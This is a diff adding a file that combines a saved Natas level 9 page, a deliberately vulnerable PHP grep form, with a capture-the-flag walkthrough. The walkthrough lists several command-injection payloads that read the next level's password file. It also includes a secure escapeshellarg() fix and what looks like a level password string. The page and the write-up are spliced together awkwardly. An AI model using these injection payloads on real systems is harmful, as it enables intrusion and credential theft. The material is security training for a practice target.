@@ -1,0 +1,135 @@
+Find words containing: 
+
+
+Output:
+EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>Natas Level 9: Command Injection
+What You See
+A search form with a "needle" input field
+The source code reveals:
+php
+<?php
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+The Vulnerability: passthru() with Unsanitized Input
+The code takes your input and directly injects it into a shell command:
+bash
+grep -i [YOUR_INPUT] dictionary.txt
+No sanitization. No validation. Your input is executed as part of a shell command.
+The Exploit: Command Injection
+Since $key is inserted directly into the command string, you can inject additional commands using shell operators.
+Goal: Read the password file at /etc/natas_webpass/natas10
+Payloads to Try
+Method 1: Command chaining with ;
+plain
+; cat /etc/natas_webpass/natas10
+Full command becomes:
+bash
+grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
+The ; terminates grep and starts a new command.
+Method 2: Command substitution with $()
+plain
+$(cat /etc/natas_webpass/natas10)
+Method 3: Pipe chaining
+plain
+| cat /etc/natas_webpass/natas10
+Method 4: AND operator
+plain
+&& cat /etc/natas_webpass/natas10
+Recommended Payload
+Enter this in the "needle" field:
+plain
+; cat /etc/natas_webpass/natas10
+Or try:
+plain
+| cat /etc/natas_webpass/natas10
+Why It Works
+Table
+Operator	Effect
+;	Run next command regardless of success
+&&	Run next command only if previous succeeds
+|	Pipe output of previous into next
+$(...)	Command substitution — execute and insert output
+The server executes:
+bash
+grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
+grep -i runs with empty pattern (fails silently), then cat runs and dumps the password file.
+Key Takeaways
+Table
+Lesson	Explanation
+Never pass user input to passthru(), exec(), system()	These execute shell commands — extremely dangerous
+Always sanitize/escape shell arguments	Use escapeshellarg() in PHP
+Use parameterized queries for OS commands too	Prefer APIs over shell execution
+Principle of least privilege	Web server shouldn't read password files
+Defense: Secure Code
+php
+<?php
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    // Escape the argument properly
+    $safe_key = escapeshellarg($key);
+    passthru("grep -i $safe_key dictionary.txt");
+}
+?>
+escapeshellarg() wraps the input in single quotes and escapes any quotes inside, preventing command injection.
+Password for Natas Level 10
+Run the exploit above to get it. The password will be displayed in the output.
+Quick Test
+If the above doesn't work, try these variations:
+Table
+Payload	Reason
+;cat /etc/natas_webpass/natas10	No spaces
+;cat /etc/natas_webpass/natas10;	Trailing semicolon
+|cat /etc/natas_webpass/natas10	Pipe instead
+$(cat /etc/natas_webpass/natas10)	Command substitution
+
+</body>
+</html>
